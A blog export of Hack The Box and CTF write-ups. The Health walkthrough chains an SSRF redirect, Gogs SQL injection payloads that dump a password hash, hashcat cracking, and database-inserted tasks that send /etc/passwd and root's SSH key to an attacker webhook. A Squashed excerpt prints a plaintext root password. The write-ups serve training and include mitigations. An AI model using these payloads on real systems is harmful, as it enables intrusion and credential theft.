python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.176 - - [05/Jan/2023 06:34:28] code 404, message File not found10.10.11.176 - - [05/Jan/2023 06:34:28] \"GET /monitored HTTP/1.0\" 404 -10.10.11.176 - - [05/Jan/2023 06:34:28] code 501, message Unsupported method ('POST')10.10.11.176 - - [05/Jan/2023 06:34:28] \"POST /payload HTTP/1.1\" 501 -It worked, but I needed something else to grab the content of the payload. I launched netcat on another port and used that for the payload URL.POST /payload/ HTTP/1.1Host: 10.10.14.6Accept: */*Content-type: application/jsonContent-Length: 117{\"webhookUrl\":\"http:\\/\\/10.10.14.6:8000\\/payload\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.6\\/monitored\\/\",\"health\":\"down\"}I started playing with sending different payloads to the application. I found out I could send it json instead of a URL-encoded form. This made it easier to read and modify in Burp Repeater.POST /webhook HTTP/1.1Host: target.htbUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 224Origin: http://target.htbConnection: closeReferer: http://target.htb/Cookie: XSRF-TOKEN=eyJpdiI6ImFsOEk3M21rVHVuTU8yRkwrc1JSeHc9PSIsInZhbHVlIjoieVBGWlc1WVBiVUFKdjV2MWRqQUorYWNxd0wwaFMwQUQ2RTFzRG9iSDJjb0lmUWJVS3dVa2RUZmtiUXBIUW85ckpZUUJVMGFPQXdERFFuaUR1SW1Mam5WUDhGSTNxdjIzWFhQVUZGcXExc2dsamJYdXhha0JBUmpXekFuR0tDN3YiLCJtYWMiOiJiMDdmMmNkMDM1ZGExMzM3OGUwMmJjNmFjNzA1NDYxNWYyYzkwOTIyNWRiZDkxZGU3M2ViY2JkM2MwNTg0MDIyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Ilk4M05WQWFmNVJSMVJoc2txNSt6Q0E9PSIsInZhbHVlIjoiZFVzOFAweStjMm9ENHZnL3VBQkMvZ1RLeVphTVovNW9PSFplYnpQeTBuTjBRKzlPRkQyb213dVN3bEhRWXNSemFqR1k1TXU0YW1ZRXhKZk85WEJmcVR4ZXZiVjVnNkR6b0Rwdno1aWI4dmI2UkQyVXhYa0JIMzBDUXlRcG54N2EiLCJtYWMiOiJkN2Q3YmE0NGFhNTRhN2YyNWFmZTQ4OWU3YTYyNzY5NjY5N2RlMzYzMGUxN2U4YzMzMGZiNjU5MzQ3ZWZmODZlIiwidGFnIjoiIn0%3DUpgrade-Insecure-Requests: 1{\t\"_token\": \"6RWanPgljj9laRaM3gHG9xNHPgibNdgtqUeN0EDO\",\t\"webhookUrl\": \"http://10.10.14.6:8000/payload\",\t\"monitoredUrl\": \"http://10.10.14.6/monitored\",\t\"frequency\": \"* * * * *\",\t\"onlyError\": 0,\t\"action\": \"Test\"}I also saw that if the monitored website was up, the content was sent to the webhook.{  \"webhookUrl\":\"http:\\/\\/10.10.14.6:8000\\/payload\",  \"monitoredUrl\":\"http:\\/\\/10.10.14.6\\/monitored\",  \"health\":\"up\",  \"body\":\"&lt;html&gt;\\n&lt;body&gt;\\nTest\\n&lt;\\/body&gt;\\n&lt;\\/html&gt;\\n\",  \"message\":\"HTTP\\/1.0 200 OK\",  \"headers\":{\"Host\":\"10.10.14.6\",\"Date\":\"Thu, 05 Jan 2023 11:48:36 GMT\",\"Connection\":\"close\",\"Content-Type\":\"text\\/html; charset=UTF-8\",\"Content-Length\":\"35\"}}I thought I could use Server-Side Request Forgery (SSRF) to read from the web server.I tried monitoring things like localhost, and files on the server. But they were rejected.There was some validation to prevent things like localhost and file://. I tried using my machine as the monitored URL and sending a redirection from it.$ cat redirect.php            &lt;?phpheader(\"Location: http://localhost/\");$ php -S 0.0.0.0:80 [Thu Jan  5 06:59:48 2023] PHP 8.1.12 Development Server (http://0.0.0.0:80) started[Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 Accepted[Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 [302]: GET /redirect.php[Thu Jan  5 07:00:19 2023] 10.10.11.176:48094 ClosingIt worked, my webhook received the content of the application.$ nc -klvnp 8000listening on [any] 8000 ...connect to [10.10.14.6] from (UNKNOWN) [10.10.11.176] 52638POST /payload HTTP/1.1Host: 10.10.14.6:8000Accept: */*Content-type: application/jsonContent-Length: 8993Expect: 100-continue{  \"webhookUrl\": \"http://10.10.14.6:8000/payload\",  \"monitoredUrl\": \"http://10.10.14.6/redirect.php\",  \"health\": \"up\",  \"body\": \"&lt;!DOCTYPE html&gt;\\n&lt;html lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n    &lt;meta charset=\\\"UTF-8\\\"&gt;\\n    &lt;meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"&gt;\\n    &lt;meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"ie=edge\\\"&gt;\\n    &lt;title&gt;HTTP Monitoring Tool&lt;\\/title&gt;\\n    &lt;link href=\\\"http:\\/\\/localhost\\/css\\/app.css\\\" rel=\\\"stylesheet\\\" type=\\\"text\\/css\\\"\\/&gt;\\n&lt;\\/head&gt;\\n&lt;body&gt;\\n&lt;div class=\\\"container\\\"&gt;\\n        &lt;div class=\\\"container\\\" style=\\\"padding: 150px\\\"&gt;\\n\\n\\t&lt;h1 class=\\\"text-center\\\"&gt;health.htb&lt;\\/h1&gt;\\n\\t&lt;h4 class=\\\"text-center\\\"&gt;Simple health checks for any URL&lt;\\/h4&gt;\\n\\n\\t&lt;hr&gt;\\n\\n\\n\\n\\n\\t&lt;p&gt;This is a free utility that allows you to remotely check whether an http service is available. It is useful if you want to check whether the server is correctly running or if there are any firewall issues blocking access.&lt;\\/p&gt;\\n\\n\\t&lt;div class=\\\"card-header\\\"&gt;\\n\\t    Configure Webhook ...\"}I was able to use it to query the server. But I already had access to the site on port 80. So that did not help much. I was going to write a script to try all ports on the server. But I remembered that RustScan did not show filtered ports. I scanned the server again, but with Nmap.$ nmap target                  Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-04 08:42 ESTNmap scan report for target (10.10.11.176)Host is up (0.025s latency).Not shown: 997 closed tcp ports (conn-refused)PORT     STATE    SERVICE22/tcp   open     ssh80/tcp   open     http3000/tcp filtered pppNmap done: 1 IP address (1 host up) scanned in 1.55 secondsPort 3000 was filtered. But I might be able to access it through the SSRF. I changed my redirection.&lt;?phpheader(\"Location: http://localhost:3000/\");And sent my payload again. This time I got the content of a different site in the webhook payload.{  \"webhookUrl\":\"http:\\/\\/10.10.14.6:8000\\/payload\",  \"monitoredUrl\":\"http:\\/\\/10.10.14.6\\/redirect.php\",  \"health\":\"up\",  \"body\":\"&lt;!DOCTYPE html&gt;\\n&lt;html&gt;\\n\\t&lt;head data-suburl=\\\"\\\"&gt;\\n\\t\\t  ...  &lt;meta name=\\\"author\\\" content=\\\"Gogs - Go Git Service\\\" \\/&gt;\\n\\t\\t  &lt;meta name=\\\"description\\\" content=\\\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\\\" \\/&gt;\\n\\t\\t  &lt;meta name=\\\"keywords\\\" content=\\\"go, git, self-hosted, gogs\\\"&gt;  ...  \\u00a9 2014 GoGits \\u00b7 Version: 0.5.5.1010 Beta   ...  \",  \"message\":\"HTTP\\/1.0 302 Found\",  \"headers\":{\"Host\":\"10.10.14.6\",\"Date\":\"Thu, 05 Jan 2023 12:32:06 GMT\",\"Connection\":\"close\",\"X-Powered-By\":\"PHP\\/8.1.12\",\"Location\":\"http:\\/\\/localhost:3000\\/\",\"Content-type\":\"text\\/html; charset=UTF-8\",\"Content-Type\":\"text\\/html; charset=UTF-8\",\"Set-Cookie\":\"_csrf=; Path=\\/; Max-Age=0\"}  }I removed the content, but we can see that the server had a very old beta version (0.5.5.1010 Beta) of Gogs.SQL InjectionI searched for known vulnerabilities in this version of Gogs and found that it was vulnerable to SQL Injection. ExploitDB had two proofs of concept (POC). The user search was simpler, so I tried this one first.I started by trying the user search feature.&lt;?phpheader('Location: http://localhost:3000/api/v1/users/search?q=a');It gave me a user back.{  \"webhookUrl\": \"http://10.10.14.6:8000/payload\",  \"monitoredUrl\": \"http://10.10.14.6/redirect.php\",  \"health\": \"up\",  \"body\": \"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\\\"}],\\\"ok\\\":true}\",  \"message\": \"HTTP/1.0 302 Found\",  \"headers\": {    \"Host\": \"10.10.14.6\",    \"Date\": \"Thu, 05 Jan 2023 12:51:23 GMT\",    \"Connection\": \"close\",    \"X-Powered-By\": \"PHP/8.1.12\",    \"Location\": \"http://localhost:3000/api/v1/users/search?q=a\",    \"Content-type\": \"text/html; charset=UTF-8\",    \"Content-Type\": \"application/json; charset=UTF-8\",    \"Set-Cookie\": \"_csrf=; Path=/; Max-Age=0\",    \"Content-Length\": \"111\"  }}I took note of the username and tried injecting some SQL. The code was removing spaces, so I had to use /**/ instead.Next, I tried the payload from the POC, but it failed. So I had to start experimenting to build my own injection.I used Order By to figure out how many fields needed to be returned by the query.header(\"Location: http://localhost:3000/api/v1/users/search?q=')/**/Order/**/By/**/27/**/--/**/-\");27 fields worked.{\"body\": \"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce\\\"}],\\\"ok\\\":true}\"}But 28 failed.header(\"Location: http://localhost:3000/api/v1/users/search?q=')/**/Order/**/By/**/28/**/--/**/-\");{  \"webhookUrl\": \"http://10.10.14.7:8000/payload\",  \"monitoredUrl\": \"http://10.10.14.7/redirect.php\",  \"health\": \"down\"}I knew I needed to return 27 fields in my union query. I had to find out which of those fields were returned in the JSON.header(\"Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'\");I could use the 3rd and 15th fields to extract data.{  \"data\": [    {      \"username\": \"3\",      \"avatar\": \"//1.gravatar.com/avatar/15\"    }  ],  \"ok\": true}I cloned the Gogs‚Äô git repository and checked out the v0.5.5 tag. I looked at the code and saw that I needed to extract the passwd and salt fields from the user table.I extracted the hashed password.header(\"Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,passwd,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'\");{  \"data\": [    {      \"username\": \"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",      \"avatar\": \"//1.gravatar.com/avatar/15\"    }  ],  \"ok\": true}And the salt.header(\"Location: http://localhost:3000/api/v1/users/search?q='/**/AND/**/1=2)/**/UNION/**/ALL/**/SELECT/**/1,2,salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/FROM/**/user/**/where/**/('%25'%3D'\");{  \"data\": [    {      \"username\": \"sO3XIbeW14\",      \"avatar\": \"//1.gravatar.com/avatar/15\"    }  ],  \"ok\": true}I needed to crack the hash, but I did not know the format I should use for hashcat. I found an issue that explained how to convert the hash to the format hashcat expected.$ echo -n 'sO3XIbeW14' | base64          c08zWEliZVcxNA==$ perl -e 'print pack (\"H*\", \"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\")' | base64 ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=I saved those values to a file and launched hashcat.$ cat hash.txt    sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txthashcat (v6.2.6) starting in autodetect mode                                                           OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCUHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDFNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.Host memory required for this attack: 1 MBDictionary cache hit:* Filename..: /usr/share/seclists/rockyou.txt* Passwords.: 14344384* Bytes.....: 139921497* Keyspace..: 14344384sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:REDACTED                                                          Session..........: hashcatStatus...........: CrackedHash.Mode........: 10900 (PBKDF2-HMAC-SHA256)Hash.Target......: sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U...9O/jc=Time.Started.....: Tue Jan  3 06:39:54 2023 (27 secs)Time.Estimated...: Tue Jan  3 06:40:21 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/seclists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:     2640 H/s (7.80ms) @ Accel:256 Loops:128 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 72192/14344384 (0.50%)Rejected.........: 0/72192 (0.00%)Restore.Point....: 70656/14344384 (0.49%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9984-9999Candidate.Engine.: Device GeneratorCandidates.#1....: jonquil -&gt; 011392Hardware.Mon.#1..: Util: 96%Started: Tue Jan  3 06:39:52 2023Stopped: Tue Jan  3 06:40:23 2023I tried ssh with the cracked password.$ ssh susanne@targetsusanne@target's password: Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Tue Jan  3 11:42:34 UTC 2023  System load:  0.01              Processes:           173  Usage of /:   66.4% of 3.84GB   Users logged in:     0  Memory usage: 11%               IP address for eth0: 10.10.11.176  Swap usage:   0%0 updates can be applied immediately.susanne@health:~$ lsuser.txtsusanne@health:~$ cat user.txt REDACTEDGetting RootOnce connected to the server, I started looking for ways to elevate my privileges. I could not run anything as sudo and I did not find any suspicious suid binaries.I looked at the websites for credentials in configuration files. The Gogs code was not readable by my user. But the Laravel app on port 80 was.susanne@health:~$ cat .env...DB_HOST=127.0.0.1DB_PORT=3306DB_DATABASE=laravelDB_USERNAME=laravelDB_PASSWORD=REDACTED...I connected to the database, but I did not find anything of interest. There was a user table, but it was empty.I created an SSH tunnel to take a better look at the Gogs installation and connected with susanne‚Äôs credentials. I found a Remote Code Execution (RCE) vulnerability in hooks. But I failed to exploit it. The endpoint to extract the hooks seems disabled. And my POST requests to create a new hook were all rejected.I kept looking around the server. I ran pspy and saw that Artisan was running as root every minute.2023/01/04 11:00:01 CMD: UID=0    PID=2384   | /bin/bash -c cd /var/www/html &amp;&amp; php artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1 I looked at what schedule:run was doing.protected function schedule(Schedule $schedule){    /* Get all tasks from the database */    $tasks = Task::all();    foreach ($tasks as $task) {        $frequency = $task-&gt;frequency;        $schedule-&gt;call(function () use ($task) {            /*  Run your task here */            HealthChecker::check($task-&gt;webhookUrl, $task-&gt;monitoredUrl, $task-&gt;onlyError);            Log::info($task-&gt;id . ' ' . \\Carbon\\Carbon::now());        })-&gt;cron($frequency);    }}It was reading tasks from the database and sending them to HeathChecker::check(). I looked at the code for this.public static function check($webhookUrl, $monitoredUrl, $onlyError = false){    $json = [];    $json['webhookUrl'] = $webhookUrl;    $json['monitoredUrl'] = $monitoredUrl;    $res = @file_get_contents($monitoredUrl, false);    if ($res) {        if ($onlyError) {            return $json;        }        $json['health'] = \"up\";        $json['body'] = $res;        if (isset($http_response_header)) {        $headers = [];        $json['message'] = $http_response_header[0];        for ($i = 0; $i &lt;= count($http_response_header) - 1; $i++) {            $split = explode(':', $http_response_header[$i], 2);            if (count($split) == 2) {                $headers[trim($split[0])] = trim($split[1]);            } else {                error_log(\"invalid header pair: $http_response_header[$i]\\n\");            }        }        $json['headers'] = $headers;        }    } else {        $json['health'] = \"down\";    }    $content = json_encode($json);    // send    $curl = curl_init($webhookUrl);    curl_setopt($curl, CURLOPT_HEADER, false);    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);    curl_setopt($curl, CURLOPT_HTTPHEADER,        array(\"Content-type: application/json\"));    curl_setopt($curl, CURLOPT_POST, true);    curl_setopt($curl, CURLOPT_POSTFIELDS, $content);    curl_exec($curl);    curl_close($curl);    return $json;}It was performing the health check by reading the monitored URL with file_get_contents and sending the result to the webhook URL. Since I had the database credentials I could insert anything in there, bypassing the validation from the website. And the code was using file_get_contents to get the monitored URL, so I could use it to read local files.I started by trying to read /etc/passwd.mysql&gt; Insert Into tasks Values (1,'10.10.14.6:8000', 0, '/etc/passwd', '* * * * *', NOW(), NOW());Query OK, 1 row affected (0.00 sec)It worked.{  \"webhookUrl\": \"10.10.14.6:8000\",  \"monitoredUrl\": \"/etc/passwd\",  \"health\": \"up\",  \"body\": \"root:x:0:0:root:\\/root:\\/bin\\/bash\\ndaemon:x:1:1:daemon:\\/usr\\/sbin:\\/usr\\/sbin\\/nologin\\nbin:x:2:2:bin:\\/bin:\\/usr\\/sbin\\/nologin\\nsys:x:3:3:sys:\\/dev:\\/usr\\/sbin\\/nologin\\nsync:x:4:65534:sync:\\/bin:\\/bin\\/sync\\ngames:x:5:60:games:\\/usr\\/games:\\/usr\\/sbin\\/nologin\\nman:x:6:12:man:\\/var\\/cache\\/man:\\/usr\\/sbin\\/nologin\\nlp:x:7:7:lp:\\/var\\/spool\\/lpd:\\/usr\\/sbin\\/nologin\\nmail:x:8:8:mail:\\/var\\/mail:\\/usr\\/sbin\\/nologin\\nnews:x:9:9:news:\\/var\\/spool\\/news:\\/usr\\/sbin\\/nologin\\nuucp:x:10:10:uucp:\\/var\\/spool\\/uucp:\\/usr\\/sbin\\/nologin\\nproxy:x:13:13:proxy:\\/bin:\\/usr\\/sbin\\/nologin\\nwww-data:x:33:33:www-data:\\/var\\/www:\\/usr\\/sbin\\/nologin\\nbackup:x:34:34:backup:\\/var\\/backups:\\/usr\\/sbin\\/nologin\\nlist:x:38:38:Mailing List Manager:\\/var\\/list:\\/usr\\/sbin\\/nologin\\nirc:x:39:39:ircd:\\/var\\/run\\/ircd:\\/usr\\/sbin\\/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\\/var\\/lib\\/gnats:\\/usr\\/sbin\\/nologin\\nnobody:x:65534:65534:nobody:\\/nonexistent:\\/usr\\/sbin\\/nologin\\nsystemd-network:x:100:102:systemd Network Management,,,:\\/run\\/systemd\\/netif:\\/usr\\/sbin\\/nologin\\nsystemd-resolve:x:101:103:systemd Resolver,,,:\\/run\\/systemd\\/resolve:\\/usr\\/sbin\\/nologin\\nsyslog:x:102:106::\\/home\\/syslog:\\/usr\\/sbin\\/nologin\\nmessagebus:x:103:107::\\/nonexistent:\\/usr\\/sbin\\/nologin\\n_apt:x:104:65534::\\/nonexistent:\\/usr\\/sbin\\/nologin\\nlxd:x:105:65534::\\/var\\/lib\\/lxd\\/:\\/bin\\/false\\nuuidd:x:106:110::\\/run\\/uuidd:\\/usr\\/sbin\\/nologin\\ndnsmasq:x:107:65534:dnsmasq,,,:\\/var\\/lib\\/misc:\\/usr\\/sbin\\/nologin\\nlandscape:x:108:112::\\/var\\/lib\\/landscape:\\/usr\\/sbin\\/nologin\\npollinate:x:109:1::\\/var\\/cache\\/pollinate:\\/bin\\/false\\nsshd:x:110:65534::\\/run\\/sshd:\\/usr\\/sbin\\/nologin\\nsusanne:x:1000:1000:susanne:\\/home\\/susanne:\\/bin\\/bash\\ngogs:x:1001:1001::\\/home\\/gogs:\\/bin\\/bash\\nmysql:x:111:114:MySQL Server,,,:\\/nonexistent:\\/bin\\/false\\n\"}Next, I extracted the /etc/shadow file and started cracking the password.While hashcat was running, I checked to see if root had an ssh key.mysql&gt; Insert Into tasks Values (1,'10.10.14.6:8000', 0, '/root/.ssh/id_rsa', '* * * * *', NOW(), NOW());Query OK, 1 row affected (0.00 sec)They did.{  \"webhookUrl\": \"10.10.14.6:8000\",  \"monitoredUrl\": \"/root/.ssh/id_rsa\",  \"health\": \"up\",  \"body\": \"-----BEGIN RSA PRIVATE KEY-----{KEY}-----END RSA PRIVATE KEY-----\"}I used the key to connect as root and read the flag.$ chmod 600 root_id_rsa $ ssh -i root_id_rsa root@target   Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Wed Jan  4 11:31:32 UTC 2023  System load:  0.0               Processes:           184  Usage of /:   66.4% of 3.84GB   Users logged in:     1  Memory usage: 15%               IP address for eth0: 10.10.11.176  Swap usage:   0%0 updates can be applied immediately.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsroot@health:~# cat root.txt REDACTEDMitigationsThere were a few issues with that box that could be fixed without too much work.First, the code that read the monitored URL should not follow redirects. The code uses file_get_contents which follows redirection by default. I didn‚Äôt see a way from preventing it from following redirects. But it‚Äôs easy to do with curl. The code should have used curl to read the monitored URL.The server was using a very old version of Gogs. The installed version is from 2014 and is beta. There is a known SQLi vulnerability in this version of Gogs. The application was not exposed to the web, but you never know if someone can find a way around that. It could be an SSRF vulnerability like in this case. Or a disgruntled employee could use it to get data they should not have access to.The password stored in the database was also very weak. Hashcat was able to break it quickly.The next issue is with Artisan running as root. It should have been executed as a low-privileged account. Since it was doing the same thing as the website, it should probably have run as the web server. The validations performed when posting a health check should also have been executed before performing the actions."
  },
  
  {
    "title": "Squashead - Hack The Box",
    "url": "/posts/htb-Squashed/",
    "categories": "hackthebox",
    "tags": "osticket, mysql, mattermost, hashcat, rules",
    "date": "2022-11-25 00:00:00 +0800",
    





    
    "snippet": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveragingmisconfigurations in NFS shares through impersonating users. Additionally, the box incorpo...",
    "content": "Squashed is an Easy Difficulty Linux machine that features a combination of both identifying and leveragingmisconfigurations in NFS shares through impersonating users. Additionally, the box incorporates theenumeration of an X11 display into the privilege escalation by having the attacker take a screenshot of thecurrent Desktop.EnumarationPort Scannmap -sC -sV 10.10.11.191Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 11:12 ISTNmap scan report for 10.10.11.191Host is up (0.13s latency).Not shown: 996 closed tcp ports (conn-refused)PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Built Better|_http-server-header: Apache/2.4.41 (Ubuntu)111/tcp  open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  3           2049/udp   nfs|   100003  3           2049/udp6  nfs|   100003  3,4         2049/tcp   nfs|   100003  3,4         2049/tcp6  nfs|   100005  1,2,3      45669/tcp6  mountd|   100005  1,2,3      50287/udp6  mountd|   100005  1,2,3      53317/tcp   mountd|   100005  1,2,3      54473/udp   mountd|   100021  1,3,4      33785/tcp6  nlockmgr|   100021  1,3,4      34763/tcp   nlockmgr|   100021  1,3,4      39022/udp   nlockmgr|   100021  1,3,4      50677/udp6  nlockmgr|   100227  3           2049/tcp   nfs_acl|   100227  3           2049/tcp6  nfs_acl|   100227  3           2049/udp   nfs_acl|_  100227  3           2049/udp6  nfs_acl2049/tcp open  nfs_acl 3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 36.97 secondsThe nmap scan shows a standard SSH service running on port 22 , an Apache webserver running on port80 , as well as NFS and rpcbind running on their default portsEnumerating NFSNFS is a server/client  system enabling users to share files and directories across a network and allowingthose shares to be mounted locally. While both useful and versatile, NFS has no protocol for authorizationor authentication, making it a common pitfall for misconfiguration and therefore exploitation.We begin our enumeration by listing any potentially available shares hosted on the target machine.  showmount -e squashed.htbPort 22No anon login allowed so let‚Äôs move on.Port 80several html pages with nothing interesting. No subdirs, no subdomains.we see the how Beutifull Website developer made$ showmont -e 10.10.11.191Export list for 10.10.11.191/home/ross */var/www/html *Since we already saw whats in /html let‚Äôs dig into home folder first      sudo mount -t nfs 10.129.228.109:/home/ross    ~/Documents/htb/squashed -o nolock‚îî‚îÄ$ dir -lahtotal 68Kdrwxr-xr-x 14 ftpuser ftpgroup 4.0K Nov 19 09:21 .drwxr-xr-x 33 kali kali 4.0K Nov 19 09:20 ..lrwxrwxrwx 1 root root 9 Oct 20 09:24 .bash_history -&gt; /dev/nulldrwx - - - 11 ftpuser ftpgroup 4.0K Oct 21 10:57 .cachedrwx - - - 12 ftpuser ftpgroup 4.0K Oct 21 10:57 .configdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Desktopdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Documentsdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Downloadsdrwx - - - 3 ftpuser ftpgroup 4.0K Oct 21 10:57 .gnupgdrwx - - - 3 ftpuser ftpgroup 4.0K Oct 21 10:57 .localdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Musicdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Picturesdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Publicdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Templatesdrwxr-xr-x 2 ftpuser ftpgroup 4.0K Oct 21 10:57 Videoslrwxrwxrwx 1 root root 9 Oct 21 09:07 .viminfo -&gt; /dev/null-rw - - - - 1 ftpuser ftpgroup 57 Nov 19 09:21 .Xauthority-rw - - - - 1 ftpuser ftpgroup 2.5K Nov 19 09:21 .xsession-errors-rw - - - - 1 ftpuser ftpgroup 2.5K Oct 31 06:13 .xsession-errors.oldDocuments contains a Passwords.kdbx, a keepass password databaseWhen listing the contents of /var/www/html , which is now mounted at /mnt/1 , it becomes evident thatwhile we can see filenames, we cannot see the files‚Äô owners or permissions. That also means we cannotread the files‚Äô contents or modify them whatsoever. We can, however, check the actual directory‚Äôspermissions by running ls on the folder itself.ls -ld /mnt/1We can see that the directory is owned by the UID 2017, and belongs to the group with the ID of www-data ,or 33 . This means that on the target box, i.e the server hosting the share, the directory is owned by a userwith that specific UID. We proceed to the second sharesudo mount -t nfs squashed.htb:/home/ross /mnt/2Following the blog we exfiltrate the cookie from our mounted share to our local attackbox and reupload it so we can use it with our alex user. Remember, we want to steal the session of ross so we have to do this on the victim.After trying xrdp for a while I checked the other xtools. https://clearlinux.org/software/bundle/x11-toolsxwd allows us to take a screenshot of the current session, this is a good start.we found the password root  cah$mei7rai9Aso we can connect with ssh"
  },
  
  {
    "title": "R2D2 Backdoor - Memory Forensics",
    "url": "/posts/CyberConFinals/",
    "categories": "CTF-TIME",
    "tags": "volatility, r2d2 backdoor",
    "date": "2022-11-15 00:00:00 +0800",
    





    
    "snippet": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional tea...",
    "content": "Hey all and welcome once more to my blog. This past weekend i had the privilege to create a forensics challenge for the CyberCon Finals CTF which was held at USIU University. Top 4 Proffesional teams and 10 University teams battled out different challenges ranging from: Web, Forensics, Pwn, Reverse Engineering. Anyway, i didn‚Äôt have enough time to properly setup a challenge from scratch, so i resolved to create some questions on a memory sample containing some nasty backdoor i was analyzing sometime back. I was happy to see folks solve most of the challenges and almost comming to the same conclusion i had before. With that said, i will be sharing my thought process on how the challenges were meant to be solved.So, what is a memory dump? Simply put, a memory dump (also known as a core dump or system dump) is a snapshot capture of computer memory data from a specific instant. A memory dump can contain valuable forensics data about the state of the system before an incident such as a crash or security compromise.  Memory forensics can provide unique insights into runtime system activity, including open network connections and recently executed commands or processes. In many cases, critical data pertaining to attacks or threats will exist solely in system memory ‚Äì examples include network connections, account credentials, chat messages, encryption keys, running processes, injected code fragments, and internet history which is non-cacheable. Any program ‚Äì malicious or otherwise ‚Äì must be loaded in memory in order to execute, making memory forensics critical for identifying otherwise obfuscated attacks. ~Source: DigitalGuardianFirst, you unzip the provided memory sample. Password: infectedTo answer the first question, you were only required to get 